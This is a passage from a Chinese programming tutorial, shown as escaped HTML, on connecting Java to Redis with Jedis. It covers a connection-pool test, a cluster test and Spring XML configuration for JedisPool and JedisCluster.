class=&quot;hljs-keyword&quot;&gt;out&lt;/span&gt;.println(result);&lt;br/&gt;jedis.close();&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通过单实例连接redis服务器，我们发现每一次连接都需要创建连接，创建连接是比较浪费资源的，所以我们需要使用连接池来连接redis数据库。&lt;/p&gt;
&lt;h3 id=&quot;h52redis&quot;&gt;&lt;span&gt;&lt;strong&gt;5.2、通过连接池连接redis服务器单机版&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;测试代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs cs&quot;&gt;    &lt;br/&gt;@&lt;span class=&quot;hljs-function&quot;&gt;Test&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;jedisPoolTest&lt;/span&gt;() throws Exception &lt;/span&gt;{&lt;br/&gt;JedisPool jedisPool = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; JedisPool(&lt;span class=&quot;hljs-string&quot;&gt;&quot;192.168.25.153&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;6379&lt;/span&gt;);&lt;br/&gt;Jedis jedis = jedisPool.getResource();&lt;br/&gt;String result = jedis.&lt;span class=&quot;hljs-keyword&quot;&gt;get&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;s11&quot;&lt;/span&gt;);&lt;br/&gt;System.&lt;span class=&quot;hljs-keyword&quot;&gt;out&lt;/span&gt;.println(result);&lt;br/&gt;jedis.close();&lt;br/&gt;jedisPool.close();&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;h53springjedispoolredis&quot;&gt;&lt;span&gt;&lt;strong&gt;5.3、使用spring整合JedisPool连接redis服务器单机版&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;添加spring的jar包&lt;br/&gt;配置spring配置文件applicationContext.xml&lt;br/&gt;applicationContext.xml&lt;/p&gt;
&lt;pre readability=&quot;7.5&quot;&gt;
&lt;code class=&quot;hljs xml&quot; readability=&quot;9&quot;&gt;&lt;span class=&quot;hljs-meta&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;beans&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;xmlns&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/beans&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xmlns:xsi&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;xmlns:mvc&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/mvc&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xmlns:context&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/context&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xmlns:aop&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/aop&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;xmlns:tx&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/tx&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xsi:schemaLocation&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/beans &lt;br/&gt;http://www.springframework.org/schema/beans/spring-beans-3.2.xsd &lt;br/&gt;http://www.springframework.org/schema/mvc &lt;br/&gt;http://www.springframework.org/schema/mvc/spring-mvc-3.2.xsd &lt;br/&gt;http://www.springframework.org/schema/context &lt;br/&gt;http://www.springframework.org/schema/context/spring-context-3.2.xsd &lt;br/&gt;http://www.springframework.org/schema/aop &lt;br/&gt;http://www.springframework.org/schema/aop/spring-aop-3.2.xsd &lt;br/&gt;http://www.springframework.org/schema/tx &lt;br/&gt;http://www.springframework.org/schema/tx/spring-tx-3.2.xsd &quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;p&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;jedisPoolConfig&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;redis.clients.jedis.JedisPoolConfig&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;property&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;maxTotal&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;30&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;property&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;maxIdle&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;10&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;property&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;numTestsPerEvictionRun&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;1024&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;property&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;timeBetweenEvictionRunsMillis&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;30000&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;property&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;minEvictableIdleTimeMillis&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;1800000&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;property&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;softMinEvictableIdleTimeMillis&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;10000&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;property&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;maxWaitMillis&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;1500&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;property&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;testOnBorrow&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;false&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;property&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;testWhileIdle&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;true&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;property&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;blockWhenExhausted&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;false&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;jedisPool&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;redis.clients.jedis.JedisPool&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;destroy-method&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;close&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;poolConfig&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;ref&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;jedisPoolConfig&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;host&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;192.168.5.128&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;port&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;6379&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;beans&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;测试代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs cs&quot;&gt;    &lt;br/&gt;@&lt;span class=&quot;hljs-function&quot;&gt;Test&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;jedisPoolTest&lt;/span&gt;() &lt;/span&gt;{&lt;br/&gt;JedisPool pool = (JedisPool) applicationContext.getBean(&lt;span class=&quot;hljs-string&quot;&gt;&quot;jedisPool&quot;&lt;/span&gt;);&lt;br/&gt;Jedis jedis = &lt;span class=&quot;hljs-literal&quot;&gt;null&lt;/span&gt;;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;try&lt;/span&gt; {&lt;br/&gt;jedis = pool.getResource();&lt;br/&gt;jedis.&lt;span class=&quot;hljs-keyword&quot;&gt;set&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;s5&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;lisi&quot;&lt;/span&gt;);&lt;br/&gt;String name = jedis.&lt;span class=&quot;hljs-keyword&quot;&gt;get&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;s5&quot;&lt;/span&gt;);&lt;br/&gt;System.&lt;span class=&quot;hljs-keyword&quot;&gt;out&lt;/span&gt;.println(name);&lt;br/&gt;} &lt;span class=&quot;hljs-keyword&quot;&gt;catch&lt;/span&gt; (Exception ex) {&lt;br/&gt;ex.printStackTrace();&lt;br/&gt;} &lt;span class=&quot;hljs-keyword&quot;&gt;finally&lt;/span&gt; {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (jedis != &lt;span class=&quot;hljs-literal&quot;&gt;null&lt;/span&gt;) {&lt;br/&gt;jedis.close();&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;h54jedisclusterredis&quot;&gt;&lt;span&gt;&lt;strong&gt;5.4、使用JedisCluster类连接redis集群版&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;第一步：使用JedisCluster对象。需要使用&lt;code&gt;Set&amp;lt;HostAndPort&amp;gt;&lt;/code&gt;参数。表示redis节点的列表。&lt;br/&gt;第二步：直接使用JedisCluster对象操作redis。该对象在系统中是单例存在的。&lt;br/&gt;第三步：打印结果。&lt;br/&gt;第四步：在系统关闭前，关闭JedisCluster对象。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs cs&quot;&gt;    &lt;br/&gt;@&lt;span class=&quot;hljs-function&quot;&gt;Test&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;jedisClusterTest&lt;/span&gt;() throws Exception &lt;/span&gt;{&lt;br/&gt;Set&amp;lt;HostAndPort&amp;gt; nodes = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; HashSet&amp;lt;&amp;gt;();&lt;br/&gt;nodes.&lt;span class=&quot;hljs-keyword&quot;&gt;add&lt;/span&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; HostAndPort(&lt;span class=&quot;hljs-string&quot;&gt;&quot;192.168.25.153&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;7001&lt;/span&gt;));&lt;br/&gt;nodes.&lt;span class=&quot;hljs-keyword&quot;&gt;add&lt;/span&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; HostAndPort(&lt;span class=&quot;hljs-string&quot;&gt;&quot;192.168.25.153&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;7002&lt;/span&gt;));&lt;br/&gt;nodes.&lt;span class=&quot;hljs-keyword&quot;&gt;add&lt;/span&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; HostAndPort(&lt;span class=&quot;hljs-string&quot;&gt;&quot;192.168.25.153&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;7003&lt;/span&gt;));&lt;br/&gt;nodes.&lt;span class=&quot;hljs-keyword&quot;&gt;add&lt;/span&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; HostAndPort(&lt;span class=&quot;hljs-string&quot;&gt;&quot;192.168.25.153&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;7004&lt;/span&gt;));&lt;br/&gt;nodes.&lt;span class=&quot;hljs-keyword&quot;&gt;add&lt;/span&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; HostAndPort(&lt;span class=&quot;hljs-string&quot;&gt;&quot;192.168.25.153&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;7005&lt;/span&gt;));&lt;br/&gt;nodes.&lt;span class=&quot;hljs-keyword&quot;&gt;add&lt;/span&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; HostAndPort(&lt;span class=&quot;hljs-string&quot;&gt;&quot;192.168.25.153&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;7006&lt;/span&gt;));&lt;br/&gt;JedisCluster jedisCluster = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; JedisCluster(nodes);&lt;br/&gt;jedisCluster.&lt;span class=&quot;hljs-keyword&quot;&gt;set&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;cluster-test&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;Jedis connects redis cluster test&quot;&lt;/span&gt;);&lt;br/&gt;String result = jedisCluster.&lt;span class=&quot;hljs-keyword&quot;&gt;get&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;cluster-test&quot;&lt;/span&gt;);&lt;br/&gt;System.&lt;span class=&quot;hljs-keyword&quot;&gt;out&lt;/span&gt;.println(result);&lt;br/&gt;jedisCluster.close();&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;h55springjedisclusterredis&quot;&gt;&lt;span&gt;&lt;strong&gt;5.5、使用spring整合JedisCluster连接redis服务器集群版&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;配置applicationContext.xml&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs xml&quot;&gt;&lt;span class=&quot;hljs-meta&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;beans&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;xmlns&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/beans&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xmlns:xsi&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;xmlns:mvc&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/mvc&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xmlns:context&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/context&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xmlns:aop&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/aop&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;xmlns:tx&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/tx&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xsi:schemaLocation&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/beans &lt;br/&gt;http://www.springframework.org/schema/beans/spring-beans-3.2.xsd &lt;br/&gt;http://www.springframework.org/schema/mvc &lt;br/&gt;http://www.springframework.org/schema/mvc/spring-mvc-3.2.xsd &lt;br/&gt;http://www.springframework.org/schema/context &lt;br/&gt;http://www.springframework.org/schema/context/spring-context-3.2.xsd &lt;br/&gt;http://www.springframework.org/schema/aop &lt;br/&gt;http://www.springframework.org/schema/aop/spring-aop-3.2.xsd &lt;br/&gt;http://www.springframework.org/schema/tx &lt;br/&gt;http://www.springframework.org/schema/tx/spring-tx-3.2.xsd &quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;jedisPoolConfig&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;redis.clients.jedis.JedisPoolConfig&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;property&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;maxTotal&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;30&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;property&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;maxIdle&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;10&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;property&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;numTestsPerEvictionRun&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;1024&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;property&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;timeBetweenEvictionRunsMillis&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;30000&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;property&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;minEvictableIdleTimeMillis&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;1800000&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;property&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;softMinEvictableIdleTimeMillis&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;10000&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;property&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;maxWaitMillis&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;1500&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;property&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;testOnBorrow&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;true&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;property&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;testWhileIdle&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;true&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;property&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;blockWhenExhausted&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;false&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;jedisCluster&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;redis.clients.jedis.JedisCluster&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;index&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;0&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span 